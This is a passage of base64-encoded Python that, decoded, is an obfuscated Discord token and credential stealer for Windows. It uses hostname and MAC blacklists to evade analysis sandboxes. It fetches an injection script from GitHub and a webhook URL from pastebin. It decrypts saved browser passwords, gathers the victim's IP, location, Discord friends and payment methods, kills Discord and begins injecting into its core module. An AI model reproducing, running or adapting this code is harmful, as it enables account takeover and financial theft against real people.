TQnLCAnREVTS1RPUC1OQUtGRk1UJywgJ1dJTi01RTA3Q09TOUFMUicsICdCMzBGMDI0Mi0xQzZBLTQnLCAnREVTS1RPUC1WUlNRTEFHJywgJ1E5SUFUUktQUkgnLCAnWEM2NFpCJywgJ0RFU0tUT1AtRDAxOUdETScsICdERVNLVE9QLVdJOENMRVQnLCAnU0VSVkVSMScsICdMSVNBLVBDJywgJ0pPSE4tUEMnLCAnREVTS1RPUC1CMFQ5M0Q2JywgJ0RFU0tUT1AtMVBZS1AyOScsICdERVNLVE9QLTFZMjQzM1InLCAnV0lMRVlQQycsICdXT1JLJywgJzZDNEU3MzNGLUMyRDktNCcsICdSQUxQSFMtUEMnLCAnREVTS1RPUC1XRzNNWUpTJywgJ0RFU0tUT1AtN1hDNkdFWicsICdERVNLVE9QLTVPVjlTME8nLCAnUWFyWmhyZEJwaicsICdPUkVMRUVQQycsICdBUkNISUJBTERQQycsICdKVUxJQS1QQycsICdkMWJuSmtmVmxIJywgJ05FVFRZUEMnLCAnREVTS1RPUC1CVUdJTycsICdERVNLVE9QLUNCR1BGRUUnLCAnU0VSVkVSLVBDJywgJ1RJUUlZTEE5VFc1TScsICdERVNLVE9QLUtBTFZJTk8nLCAnQ09NUE5BTUVfNDA0NycsICdERVNLVE9QLTE5T0xMVEQnLCAnREVTS1RPUC1ERTM2OVNFJywgJ0VBOEMyRTJBLUQwMTctNCcsICdBSURBTlBDJywgJ0xVQ0FTLVBDJywgJ01BUkNJLVBDJywgJ0FDRVBDJywgJ01JS0UtUEMnLCAnREVTS1RPUC1JQVBLTjFQJywgJ0RFU0tUT1AtTlRVN1ZVTycsICdMT1VJU0UtUEMnLCAnVDAwOTE3JywgJ3Rlc3Q0MiddCgogICAgICAgIGhvc3RuYW1lID0gc29ja2V0LmdldGhvc3RuYW1lKCkKCiAgICAgICAgaWYgYW55KG5hbWUgaW4gaG9zdG5hbWUgZm9yIG5hbWUgaW4gYmxhY2tsaXN0VXNlcm5hbWUpOgogICAgICAgICAgICBvcy5fZXhpdCgwKQoKICAgIGtvbnRyb2woKQoKICAgIEJMQUNLTElTVDEgPSBbJzAwOjE1OjVkOjAwOjA3OjM0JywgJzAwOmUwOjRjOmI4OjdhOjU4JywgJzAwOjBjOjI5OjJjOmMxOjIxJywgJzAwOjI1OjkwOjY1OjM5OmU0JywgJ2M4OjlmOjFkOmI2OjU4OmU0JywgJzAwOjI1OjkwOjM2OjY1OjBjJywgJzAwOjE1OjVkOjAwOjAwOmYzJywgJzJlOmI4OjI0OjRkOmY3OmRlJywgJzAwOjE1OjVkOjEzOjZkOjBjJywgJzAwOjUwOjU2OmEwOmRkOjAwJywgJzAwOjE1OjVkOjEzOjY2OmNhJywgJzU2OmU4OjkyOjJlOjc2OjBkJywgJ2FjOjFmOjZiOmQwOjQ4OmZlJywgJzAwOmUwOjRjOjk0OjFmOjIwJywgJzAwOjE1OjVkOjAwOjA1OmQ1JywgJzAwOmUwOjRjOjRiOjRhOjQwJywgJzQyOjAxOjBhOjhhOjAwOjIyJywgJzAwOjFiOjIxOjEzOjE1OjIwJywgJzAwOjE1OjVkOjAwOjA2OjQzJywgJzAwOjE1OjVkOjFlOjAxOmM4JywgJzAwOjUwOjU2OmIzOjM4OjY4JywgJzYwOjAyOjkyOjNkOmYxOjY5JywgJzAwOmUwOjRjOjdiOjdiOjg2JywgJzAwOmUwOjRjOjQ2OmNmOjAxJywgJzQyOjg1OjA3OmY0OjgzOmQwJywgJzU2OmIwOjZmOmNhOjBhOmU3JywgJzEyOjFiOjllOjNjOmE2OjJjJywgJzAwOjE1OjVkOjAwOjFjOjlhJywgJzAwOjE1OjVkOjAwOjFhOmI5JywgJ2I2OmVkOjlkOjI3OmY0OmZhJywgJzAwOjE1OjVkOjAwOjAxOjgxJywgJzRlOjc5OmMwOmQ5OmFmOmMzJywgJzAwOjE1OjVkOmI2OmUwOmNjJywgJzAwOjE1OjVkOjAwOjAyOjI2JywgJzAwOjUwOjU2OmIzOjA1OmI0JywgJzFjOjk5OjU3OjFjOmFkOmU0JywgJzA4OjAwOjI3OjNhOjI4OjczJywgJzAwOjE1OjVkOjAwOjAwOmMzJywgJzAwOjUwOjU2OmEwOjQ1OjAzJywgJzEyOjhhOjVjOjJhOjY1OmQxJywgJzAwOjI1OjkwOjM2OmYwOjNiJywgJzAwOjFiOjIxOjEzOjIxOjI2JywgJzQyOjAxOjBhOjhhOjAwOjIyJywgJzAwOjFiOjIxOjEzOjMyOjUxJywgJ2E2OjI0OmFhOmFlOmU2OjEyJywgJzA4OjAwOjI3OjQ1OjEzOjEwJywgJzAwOjFiOjIxOjEzOjI2OjQ0JywgJzNjOmVjOmVmOjQzOmZlOmRlJywgJ2Q0OjgxOmQ3OmVkOjI1OjU0JywgJzAwOjI1OjkwOjM2OjY1OjM4JywgJzAwOjAzOjQ3OjYzOjhiOmRlJywgJzAwOjE1OjVkOjAwOjA1OjhkJywgJzAwOjBjOjI5OjUyOjUyOjUwJywgJzAwOjUwOjU2OmIzOjQyOjMzJywgJzNjOmVjOmVmOjQ0OjAxOjBjJywgJzA2Ojc1OjkxOjU5OjNlOjAyJywgJzQyOjAxOjBhOjhhOjAwOjMzJywgJ2VhOmY2OmYxOmEyOjMzOjc2JywgJ2FjOjFmOjZiOmQwOjRkOjk4JywgJzFlOjZjOjM0OjkzOjY4OjY0JywgJzAwOjUwOjU2OmEwOjYxOmFhJywgJzQyOjAxOjBhOjk2OjAwOjIyJywgJzAwOjUwOjU2OmIzOjIxOjI5JywgJzAwOjE1OjVkOjAwOjAwOmIzJywgJzk2OjJiOmU5OjQzOjk2Ojc2JywgJ2I0OmE5OjVhOmIxOmM2OmZkJywgJ2Q0OjgxOmQ3Ojg3OjA1OmFiJywgJ2FjOjFmOjZiOmQwOjQ5Ojg2JywgJzUyOjU0OjAwOjhiOmE2OjA4JywgJzAwOjBjOjI5OjA1OmQ4OjZlJywgJzAwOjIzOmNkOmZmOjk0OmYwJywgJzAwOmUwOjRjOmQ2Ojg2Ojc3JywgJzNjOmVjOmVmOjQ0OjAxOmFhJywgJzAwOjE1OjVkOjIzOjRjOmEzJywgJzAwOjFiOjIxOjEzOjMzOjU1JywgJzAwOjE1OjVkOjAwOjAwOmE0JywgJzE2OmVmOjIyOjA0OmFmOjc2JywgJzAwOjE1OjVkOjIzOjRjOmFkJywgJzFhOjZjOjYyOjYwOjNiOmY0JywgJzAwOjE1OjVkOjAwOjAwOjFkJywgJzAwOjUwOjU2OmEwOmNkOmE4JywgJzAwOjUwOjU2OmIzOmZhOjIzJywgJzUyOjU0OjAwOmEwOjQxOjkyJywgJzAwOjUwOjU2OmIzOmY2OjU3JywgJzAwOmUwOjRjOjU2OjQyOjk3JywgJ2NhOjRkOjRiOmNhOjE4OmNjJywgJ2Y2OmE1OjQxOjMxOmIyOjc4JywgJ2Q2OjAzOmU0OmFiOjc3OjhlJywgJzAwOjUwOjU2OmFlOmIyOmIwJywgJzAwOjUwOjU2OmIzOjk0OmNiJywgJzQyOjAxOjBhOjhlOjAwOjIyJywgJzAwOjUwOjU2OmIzOjRjOmJmJywgJzAwOjUwOjU2OmIzOjA5OjllJywgJzAwOjUwOjU2OmIzOjM4Ojg4JywgJzAwOjUwOjU2OmEwOmQwOmZhJywgJzAwOjUwOjU2OmIzOjkxOmM4JywgJzNlOmMxOmZkOmYxOmJmOjcxJywgJzAwOjUwOjU2OmEwOjZkOjg2JywgJzAwOjUwOjU2OmEwOmFmOjc1JywgJzAwOjUwOjU2OmIzOmRkOjAzJywgJ2MyOmVlOmFmOmZkOjI5OjIxJywgJzAwOjUwOjU2OmIzOmVlOmUxJywgJzAwOjUwOjU2OmEwOjg0Ojg4JywgJzAwOjFiOjIxOjEzOjMyOjIwJywgJzNjOmVjOmVmOjQ0OjAwOmQwJywgJzAwOjUwOjU2OmFlOmU1OmQ1JywgJzAwOjUwOjU2Ojk3OmY2OmM4JywgJzUyOjU0OjAwOmFiOmRlOjU5JywgJzAwOjUwOjU2OmIzOjllOjllJywgJzAwOjUwOjU2OmEwOjM5OjE4JywgJzMyOjExOjRkOmQwOjRhOjllJywgJzAwOjUwOjU2OmIzOmQwOmE3JywgJzk0OmRlOjgwOmRlOjFhOjM1JywgJzAwOjUwOjU2OmFlOjVkOmVhJywgJzAwOjUwOjU2OmIzOjE0OjU5JywgJ2VhOjAyOjc1OjNjOjkwOjlmJywgJzAwOmUwOjRjOjQ0Ojc2OjU0JywgJ2FjOjFmOjZiOmQwOjRkOmU0JywgJzUyOjU0OjAwOjNiOjc4OjI0JywgJzAwOjUwOjU2OmIzOjUwOmRlJywgJzdlOjA1OmEzOjYyOjljOjRkJywgJzUyOjU0OjAwOmIzOmU0OjcxJywgJzkwOjQ4OjlhOjlkOmQ1OjI0JywgJzAwOjUwOjU2OmIzOjNiOmE2JywgJzkyOjRjOmE4OjIzOmZjOjJlJywgJzVhOmUyOmE2OmE0OjQ0OmRiJywgJzAwOjUwOjU2OmFlOjZmOjU0JywgJzQyOjAxOjBhOjk2OjAwOjMzJywgJzAwOjUwOjU2Ojk3OmExOmY4JywgJzVlOjg2OmU0OjNkOjBkOmY2JywgJzAwOjUwOjU2OmIzOmVhOmVlJywgJzNlOjUzOjgxOmI3OjAxOjEzJywgJzAwOjUwOjU2Ojk3OmVjOmYyJywgJzAwOmUwOjRjOmIzOjVhOjJhJywgJzEyOmY4Ojg3OmFiOjEzOmVjJywgJzAwOjUwOjU2OmEwOjM4OjA2JywgJzJlOjYyOmU4OjQ3OjE0OjQ5JywgJzAwOjBkOjNhOmQyOjRmOjFmJywgJzYwOjAyOjkyOjY2OjEwOjc5JywgJycsICcwMDo1MDo1NjphMDpkNzozOCcsICdiZTowMDplNTpjNTowYzplNScsICcwMDo1MDo1NjphMDo1OToxMCcsICcwMDo1MDo1NjphMDowNjo4ZCcsICcwMDplMDo0YzpjYjo2MjowOCcsICc0ZTo4MTo4MTo4ZToyMjo0ZSddCgogICAgbWFjX2FkZHJlc3MgPSB1dWlkLmdldG5vZGUoKQogICAgaWYgc3RyKHV1aWQuVVVJRChpbnQ9bWFjX2FkZHJlc3MpKSBpbiBCTEFDS0xJU1QxOgogICAgICAgIG9zLl9leGl0KDApCgoKICAgIGlual91cmwgPSAiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0F5aHV1dS9pbmplY3Rpb24vbWFpbi9pbmRleC5qcyIKICAgICAgICAKICAgIERFVEVDVEVEID0gRmFsc2UKICAgICNiaXIgdWNha3RpayBkdXN0dWsgYmlyIGdlbWl5ZGlrIGJhdHRpayA6KAogICAgZGVmIGczdDFwKCk6CiAgICAgICAgaXAgPSAiTm9uZSIKICAgICAgICB0cnk6CiAgICAgICAgICAgIGlwID0gdXJsb3BlbihSZXF1ZXN0KCJodHRwczovL2FwaS5pcGlmeS5vcmciKSkucmVhZCgpLmRlY29kZSgpLnN0cmlwKCkKICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgIHBhc3MKICAgICAgICByZXR1cm4gaXAKCiAgICByZXF1aXJlbWVudHMgPSBbCiAgICAgICAgWyJyZXF1ZXN0cyIsICJyZXF1ZXN0cyJdLAogICAgICAgIFsiQ3J5cHRvLkNpcGhlciIsICJweWNyeXB0b2RvbWUiXSwKICAgIF0KICAgIGZvciBtb2RsIGluIHJlcXVpcmVtZW50czoKICAgICAgICB0cnk6IF9faW1wb3J0X18obW9kbFswXSkKICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgIHN1YnByb2Nlc3MuUG9wZW4oZiJ7ZXhlY3V0YWJsZX0gLW0gcGlwIGluc3RhbGwge21vZGxbMV19Iiwgc2hlbGw9VHJ1ZSkKICAgICAgICAgICAgdGltZS5zbGVlcCgzKQoKICAgIGltcG9ydCByZXF1ZXN0cwogICAgCiAgICBmcm9tIENyeXB0by5DaXBoZXIgaW1wb3J0IEFFUwoKICAgIGxvY2FsID0gb3MuZ2V0ZW52KCdMT0NBTEFQUERBVEEnKQogICAgcm9hbWluZyA9IG9zLmdldGVudignQVBQREFUQScpCiAgICB0ZW1wID0gb3MuZ2V0ZW52KCJURU1QIikKICAgIFRocmVhZGxpc3QgPSBbXQoKCiAgICBjbGFzcyBEQVRBX0JMT0IoU3RydWN0dXJlKToKICAgICAgICBfZmllbGRzXyA9IFsKICAgICAgICAgICAgKCdjYkRhdGEnLCB3aW50eXBlcy5EV09SRCksCiAgICAgICAgICAgICgncGJEYXRhJywgUE9JTlRFUihjX2NoYXIpKQogICAgICAgIF0KCiAgICBkZWYgRzN0RDR0NChibG9iX291dCk6CiAgICAgICAgY2JEYXRhID0gaW50KGJsb2Jfb3V0LmNiRGF0YSkKICAgICAgICBwYkRhdGEgPSBibG9iX291dC5wYkRhdGEKICAgICAgICBidWZmZXIgPSBjX2J1ZmZlcihjYkRhdGEpCiAgICAgICAgY2RsbC5tc3ZjcnQubWVtY3B5KGJ1ZmZlciwgcGJEYXRhLCBjYkRhdGEpCiAgICAgICAgd2luZGxsLmtlcm5lbDMyLkxvY2FsRnJlZShwYkRhdGEpCiAgICAgICAgcmV0dXJuIGJ1ZmZlci5yYXcKCiAgICBkZWYgQ3J5cHRVbnByb3RlY3REYXRhKGVuY3J5cHRlZF9ieXRlcywgZW50cm9weT1iJycpOgogICAgICAgIGJ1ZmZlcl9pbiA9IGNfYnVmZmVyKGVuY3J5cHRlZF9ieXRlcywgbGVuKGVuY3J5cHRlZF9ieXRlcykpCiAgICAgICAgYnVmZmVyX2VudHJvcHkgPSBjX2J1ZmZlcihlbnRyb3B5LCBsZW4oZW50cm9weSkpCiAgICAgICAgYmxvYl9pbiA9IERBVEFfQkxPQihsZW4oZW5jcnlwdGVkX2J5dGVzKSwgYnVmZmVyX2luKQogICAgICAgIGJsb2JfZW50cm9weSA9IERBVEFfQkxPQihsZW4oZW50cm9weSksIGJ1ZmZlcl9lbnRyb3B5KQogICAgICAgIGJsb2Jfb3V0ID0gREFUQV9CTE9CKCkKCiAgICAgICAgaWYgd2luZGxsLmNyeXB0MzIuQ3J5cHRVbnByb3RlY3REYXRhKGJ5cmVmKGJsb2JfaW4pLCBOb25lLCBieXJlZihibG9iX2VudHJvcHkpLCBOb25lLCBOb25lLCAweDAxLCBieXJlZihibG9iX291dCkpOgogICAgICAgICAgICByZXR1cm4gRzN0RDR0NChibG9iX291dCkKCiAgICBkZWYgRDNrcnlwdFY0bFUzKGJ1ZmYsIG1hc3Rlcl9rZXk9Tm9uZSk6CiAgICAgICAgc3RhcnRzID0gYnVmZi5kZWNvZGUoZW5jb2Rpbmc9J3V0ZjgnLCBlcnJvcnM9J2lnbm9yZScpWzozXQogICAgICAgIGlmIHN0YXJ0cyA9PSAndjEwJyBvciBzdGFydHMgPT0gJ3YxMSc6CiAgICAgICAgICAgIGl2ID0gYnVmZlszOjE1XQogICAgICAgICAgICBwYXlsb2FkID0gYnVmZlsxNTpdCiAgICAgICAgICAgIGNpcGhlciA9IEFFUy5uZXcobWFzdGVyX2tleSwgQUVTLk1PREVfR0NNLCBpdikKICAgICAgICAgICAgZGVjcnlwdGVkX3Bhc3MgPSBjaXBoZXIuZGVjcnlwdChwYXlsb2FkKQogICAgICAgICAgICBkZWNyeXB0ZWRfcGFzcyA9IGRlY3J5cHRlZF9wYXNzWzotMTZdLmRlY29kZSgpCiAgICAgICAgICAgIHJldHVybiBkZWNyeXB0ZWRfcGFzcwoKICAgIGRlZiBMMDRkUjNxdTNzVHMobWV0aG9kZSwgdXJsLCBkYXRhPScnLCBmaWxlcz0nJywgaGVhZGVycz0nJyk6CiAgICAgICAgZm9yIGkgaW4gcmFuZ2UoOCk6ICMgbWF4IHRyeXMKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgaWYgbWV0aG9kZSA9PSAnUE9TVCc6CiAgICAgICAgICAgICAgICAgICAgaWYgZGF0YSAhPSAnJzoKICAgICAgICAgICAgICAgICAgICAgICAgciA9IHJlcXVlc3RzLnBvc3QodXJsLCBkYXRhPWRhdGEpCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIHIuc3RhdHVzX2NvZGUgPT0gMjAwOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIHIKICAgICAgICAgICAgICAgICAgICBlbGlmIGZpbGVzICE9ICcnOgogICAgICAgICAgICAgICAgICAgICAgICByID0gcmVxdWVzdHMucG9zdCh1cmwsIGZpbGVzPWZpbGVzKQogICAgICAgICAgICAgICAgICAgICAgICBpZiByLnN0YXR1c19jb2RlID09IDIwMCBvciByLnN0YXR1c19jb2RlID09IDQxMzoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiByCiAgICAgICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgICAgIHBhc3MKICAgIHRlbG5ldCA9IHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L3ZiNjA4dDlEIikudGV4dAogICAgZGVmIEwwNGR1cmwxYih0ZWxuZXQsIGRhdGE9JycsIGZpbGVzPScnLCBoZWFkZXJzPScnKToKICAgICAgICBmb3IgaSBpbiByYW5nZSg4KToKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgaWYgaGVhZGVycyAhPSAnJzoKICAgICAgICAgICAgICAgICAgICByID0gdXJsb3BlbihSZXF1ZXN0KHRlbG5ldCwgZGF0YT1kYXRhLCBoZWFkZXJzPWhlYWRlcnMpKQogICAgICAgICAgICAgICAgICAgIHJldHVybiByCiAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgIHIgPSB1cmxvcGVuKFJlcXVlc3QodGVsbmV0LCBkYXRhPWRhdGEpKQogICAgICAgICAgICAgICAgICAgIHJldHVybiByCiAgICAgICAgICAgIGV4Y2VwdDogCiAgICAgICAgICAgICAgICBwYXNzCgogICAgZGVmIGdsb2JhbEluZm8oKToKICAgICAgICBpcCA9IGczdDFwKCkKICAgICAgICB1czNybjRtMSA9IG9zLmdldGVudigiVVNFUk5BTUUiKQogICAgICAgIGlwZGF0YW5vanNvbiA9IHVybG9wZW4oUmVxdWVzdChmImh0dHBzOi8vZ2VvbG9jYXRpb24tZGIuY29tL2pzb25wL3tpcH0iKSkucmVhZCgpLmRlY29kZSgpLnJlcGxhY2UoJ2NhbGxiYWNrKCcsICcnKS5yZXBsYWNlKCd9KScsICd9JykKICAgICAgICAjIHByaW50KGlwZGF0YW5vanNvbikKICAgICAgICBpcGRhdGEgPSBqc29uLmxvYWRzKGlwZGF0YW5vanNvbikKICAgICAgICAjIHByaW50KHVybG9wZW4oUmVxdWVzdChmImh0dHBzOi8vZ2VvbG9jYXRpb24tZGIuY29tL2pzb25wL3tpcH0iKSkucmVhZCgpLmRlY29kZSgpKQogICAgICAgIGNvbnRyeSA9IGlwZGF0YVsiY291bnRyeV9uYW1lIl0KICAgICAgICBjb250cnlDb2RlID0gaXBkYXRhWyJjb3VudHJ5X2NvZGUiXS5sb3dlcigpCiAgICAgICAgc2VoaXIgPSBpcGRhdGFbInN0YXRlIl0KCiAgICAgICAgZ2xvYmFsaW5mbyA9IGYiOmZsYWdfe2NvbnRyeUNvZGV9OiAgLSBge3VzM3JuNG0xLnVwcGVyKCl9IHwge2lwfSAoe2NvbnRyeX0pYCIKICAgICAgICByZXR1cm4gZ2xvYmFsaW5mbwoKCiAgICBkZWYgVFI2c3QoQzAwazEzKToKICAgICAgICAjIHNpbXBsZSBUcnVzdCBGYWN0b3Igc3lzdGVtCiAgICAgICAgZ2xvYmFsIERFVEVDVEVECiAgICAgICAgZGF0YSA9IHN0cihDMDBrMTMpCiAgICAgICAgdGltID0gcmUuZmluZGFsbCgiLmdvb2dsZS5jb20iLCBkYXRhKQogICAgICAgICMgcHJpbnQobGVuKHRpbSkpCiAgICAgICAgaWYgbGVuKHRpbSkgPCAtMToKICAgICAgICAgICAgREVURUNURUQgPSBUcnVlCiAgICAgICAgICAgIHJldHVybiBERVRFQ1RFRAogICAgICAgIGVsc2U6CiAgICAgICAgICAgIERFVEVDVEVEID0gRmFsc2UKICAgICAgICAgICAgcmV0dXJuIERFVEVDVEVECiAgICAgICAgICAgIAogICAgZGVmIEczdFVIUUZyMTNuZFModDBrM24pOgogICAgICAgIGI0ZGczTGlzdCA9ICBbCiAgICAgICAgICAgIHsiTmFtZSI6ICdFYXJseV9WZXJpZmllZF9Cb3RfRGV2ZWxvcGVyJywgJ1ZhbHVlJzogMTMxMDcyLCAnRW1vamknOiAiPDpkZXZlbG9wZXI6ODc0NzUwODA4NDcyODI1OTg2PiAifSwKICAgICAgICAgICAgeyJOYW1lIjogJ0J1Z19IdW50ZXJfTGV2ZWxfMicsICdWYWx1ZSc6IDE2Mzg0LCAnRW1vamknOiAiPDpidWdodW50ZXJfMjo4NzQ3NTA4MDg0MzA4NzQ2NjQ+ICJ9LAogICAgICAgICAgICB7Ik5hbWUiOiAnRWFybHlfU3VwcG9ydGVyJywgJ1ZhbHVlJzogNTEyLCAnRW1vamknOiAiPDplYXJseV9zdXBwb3J0ZXI6ODc0NzUwODA4NDE0MTEzODIzPiAifSwKICAgICAgICAgICAgeyJOYW1lIjogJ0hvdXNlX0JhbGFuY2UnLCAnVmFsdWUnOiAyNTYsICdFbW9qaSc6ICI8OmJhbGFuY2U6ODc0NzUwODA4MjY3MjkyNjgzPiAifSwKICAgICAgICAgICAgeyJOYW1lIjogJ0hvdXNlX0JyaWxsaWFuY2UnLCAnVmFsdWUnOiAxMjgsICdFbW9qaSc6ICI8OmJyaWxsaWFuY2U6ODc0NzUwODA4MzM4NjA4MTk5PiAifSwKICAgICAgICAgICAgeyJOYW1lIjogJ0hvdXNlX0JyYXZlcnknLCAnVmFsdWUnOiA2NCwgJ0Vtb2ppJzogIjw6YnJhdmVyeTo4NzQ3NTA4MDgzODg5NTIwNzU+ICJ9LAogICAgICAgICAgICB7Ik5hbWUiOiAnQnVnX0h1bnRlcl9MZXZlbF8xJywgJ1ZhbHVlJzogOCwgJ0Vtb2ppJzogIjw6YnVnaHVudGVyXzE6ODc0NzUwODA4NDI2NjkyNjU4PiAifSwKICAgICAgICAgICAgeyJOYW1lIjogJ0h5cGVTcXVhZF9FdmVudHMnLCAnVmFsdWUnOiA0LCAnRW1vamknOiAiPDpoeXBlc3F1YWRfZXZlbnRzOjg3NDc1MDgwODU5NDQ3NzA1Nj4gIn0sCiAgICAgICAgICAgIHsiTmFtZSI6ICdQYXJ0bmVyZWRfU2VydmVyX093bmVyJywgJ1ZhbHVlJzogMiwnRW1vamknOiAiPDpwYXJ0bmVyOjg3NDc1MDgwODY3ODM1NDk2ND4gIn0sCiAgICAgICAgICAgIHsiTmFtZSI6ICdEaXNjb3JkX0VtcGxveWVlJywgJ1ZhbHVlJzogMSwgJ0Vtb2ppJzogIjw6c3RhZmY6ODc0NzUwODA4NzI4NjY2MTUyPiAifQogICAgICAgIF0KICAgICAgICBoZWFkZXJzID0gewogICAgICAgICAgICAiQXV0aG9yaXphdGlvbiI6IHQwazNuLAogICAgICAgICAgICAiQ29udGVudC1UeXBlIjogImFwcGxpY2F0aW9uL2pzb24iLAogICAgICAgICAgICAiVXNlci1BZ2VudCI6ICJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0OyBydjoxMDIuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDIuMCIKICAgICAgICB9CiAgICAgICAgdHJ5OgogICAgICAgICAgICBmcmllbmRsaXN0ID0ganNvbi5sb2Fkcyh1cmxvcGVuKFJlcXVlc3QoImh0dHBzOi8vZGlzY29yZC5jb20vYXBpL3Y2L3VzZXJzL0BtZS9yZWxhdGlvbnNoaXBzIiwgaGVhZGVycz1oZWFkZXJzKSkucmVhZCgpLmRlY29kZSgpKQogICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgcmV0dXJuIEZhbHNlCgogICAgICAgIHVocWxpc3QgPSAnJwogICAgICAgIGZvciBmcmllbmQgaW4gZnJpZW5kbGlzdDoKICAgICAgICAgICAgT3duM2RCM2RnNHMgPSAnJwogICAgICAgICAgICBmbGFncyA9IGZyaWVuZFsndXNlciddWydwdWJsaWNfZmxhZ3MnXQogICAgICAgICAgICBmb3IgYjRkZzMgaW4gYjRkZzNMaXN0OgogICAgICAgICAgICAgICAgaWYgZmxhZ3MgLy8gYjRkZzNbIlZhbHVlIl0gIT0gMCBhbmQgZnJpZW5kWyd0eXBlJ10gPT0gMToKICAgICAgICAgICAgICAgICAgICBpZiBub3QgIkhvdXNlIiBpbiBiNGRnM1siTmFtZSJdOgogICAgICAgICAgICAgICAgICAgICAgICBPd24zZEIzZGc0cyArPSBiNGRnM1siRW1vamkiXQogICAgICAgICAgICAgICAgICAgIGZsYWdzID0gZmxhZ3MgJSBiNGRnM1siVmFsdWUiXQogICAgICAgICAgICBpZiBPd24zZEIzZGc0cyAhPSAnJzoKICAgICAgICAgICAgICAgIHVocWxpc3QgKz0gZiJ7T3duM2RCM2RnNHN9IHwge2ZyaWVuZFsndXNlciddWyd1c2VybmFtZSddfSN7ZnJpZW5kWyd1c2VyJ11bJ2Rpc2NyaW1pbmF0b3InXX0gKHtmcmllbmRbJ3VzZXInXVsnaWQnXX0pXG4iCiAgICAgICAgcmV0dXJuIHVocWxpc3QKCgogICAgcHJvY2Vzc19saXN0ID0gb3MucG9wZW4oJ3Rhc2tsaXN0JykucmVhZGxpbmVzKCkKCgogICAgZm9yIHByb2Nlc3MgaW4gcHJvY2Vzc19saXN0OgogICAgICAgIGlmICJEaXNjb3JkIiBpbiBwcm9jZXNzOgogICAgICAgICAgICAKICAgICAgICAgICAgcGlkID0gaW50KHByb2Nlc3Muc3BsaXQoKVsxXSkKICAgICAgICAgICAgb3Muc3lzdGVtKGYidGFza2tpbGwgL0YgL1BJRCB7cGlkfSIpCgogICAgZGVmIEczdGIxbGwxbmcodDBrM24pOgogICAgICAgIGhlYWRlcnMgPSB7CiAgICAgICAgICAgICJBdXRob3JpemF0aW9uIjogdDBrM24sCiAgICAgICAgICAgICJDb250ZW50LVR5cGUiOiAiYXBwbGljYXRpb24vanNvbiIsCiAgICAgICAgICAgICJVc2VyLUFnZW50IjogIk1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQ7IHJ2OjEwMi4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwMi4wIgogICAgICAgIH0KICAgICAgICB0cnk6CiAgICAgICAgICAgIGIxbGwxbmdqc29uID0ganNvbi5sb2Fkcyh1cmxvcGVuKFJlcXVlc3QoImh0dHBzOi8vZGlzY29yZC5jb20vYXBpL3VzZXJzL0BtZS9iaWxsaW5nL3BheW1lbnQtc291cmNlcyIsIGhlYWRlcnM9aGVhZGVycykpLnJlYWQoKS5kZWNvZGUoKSkKICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgIHJldHVybiBGYWxzZQogICAgICAgIAogICAgICAgIGlmIGIxbGwxbmdqc29uID09IFtdOiByZXR1cm4gImBgYE5vbmVgYGAiCgogICAgICAgIGIxbGwxbmcgPSAiIgogICAgICAgIGZvciBtZXRob2RlIGluIGIxbGwxbmdqc29uOgogICAgICAgICAgICBpZiBtZXRob2RlWyJpbnZhbGlkIl0gPT0gRmFsc2U6CiAgICAgICAgICAgICAgICBpZiBtZXRob2RlWyJ0eXBlIl0gPT0gMToKICAgICAgICAgICAgICAgICAgICBiMWxsMW5nICs9ICI6Y3JlZGl0X2NhcmQ6IgogICAgICAgICAgICAgICAgZWxpZiBtZXRob2RlWyJ0eXBlIl0gPT0gMjoKICAgICAgICAgICAgICAgICAgICBiMWxsMW5nICs9ICI6cGFya2luZzogIgoKICAgICAgICByZXR1cm4gYjFsbDFuZwoKICAgIGRlZiBpbmpfZGlzY29yZCgpOgoKICAgICAgICB1c2VybmFtZSA9IG9zLmdldGxvZ2luKCkKCiAgICAgICAgZm9sZGVyX2xpc3QgPSBbJ0Rpc2NvcmQnLCAnRGlzY29yZENhbmFyeScsICdEaXNjb3JkUFRCJywgJ0Rpc2NvcmREZXZlbG9wbWVudCddCgogICAgICAgIGZvciBmb2xkZXJfbmFtZSBpbiBmb2xkZXJfbGlzdDoKICAgICAgICAgICAgZGVuZW1lX3BhdGggPSBvcy5wYXRoLmpvaW4ob3MuZ2V0ZW52KCdMT0NBTEFQUERBVEEnKSwgZm9sZGVyX25hbWUpCiAgICAgICAgICAgIGlmIG9zLnBhdGguaXNkaXIoZGVuZW1lX3BhdGgpOgogICAgICAgICAgICAgICAgZm9yIHN1YmRpciwgZGlycywgZmlsZXMgaW4gb3Mud2FsayhkZW5lbWVfcGF0aCk6CiAgICAgICAgICAgICAgICAgICAgaWYgJ2FwcC0nIGluIHN1YmRpcjoKICAgICAgICAgICAgICAgICAgICAgICAgZm9yIGRpciBpbiBkaXJzOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgJ21vZHVsZXMnIGluIGRpcjoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBtb2R1bGVfcGF0aCA9IG9zLnBhdGguam9pbihzdWJkaXIsIGRpcikKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3Igc3Vic3ViZGlyLCBzdWJkaXJzLCBzdWJmaWxlcyBpbiBvcy53YWxrKG1vZHVsZV9wYXRoKToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgJ2Rpc2NvcmRfZGVza3RvcF9jb3JlLScgaW4gc3Vic3ViZGlyOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yIHN1YnN1YnN1YmRpciwgc3Vic3ViZGlycywgc3Vic3ViZmls